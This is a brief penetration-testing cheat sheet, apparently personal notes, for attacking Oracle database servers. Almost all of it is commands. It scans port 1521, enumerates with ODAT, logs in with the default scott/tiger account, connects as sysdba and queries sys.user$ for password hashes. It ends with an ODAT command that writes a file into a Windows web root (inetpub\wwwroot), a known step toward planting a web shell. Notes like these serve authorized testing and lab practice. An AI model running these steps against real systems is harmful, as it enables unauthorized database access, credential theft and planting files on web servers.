# Nmap scan
```
sudo nmap -p1521 -sV "ip" --open
```
# Enumeration (ODAT)
```
odat.py all -s "$ip"
```

# Connect to database
```
sqlplus scott/tiger@"$ip"/XE
```
#### List all the tables
```
select table_name from all_tables;
```
#### Database enumeration
```
sqlplus <user>/<pass>@"$ip"/XE as sysdba
```
#### Extract password hashes
```
Select name, password from sys.user$;
```

# File upload
```
./odat.py utlfile -s "$ip" -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```
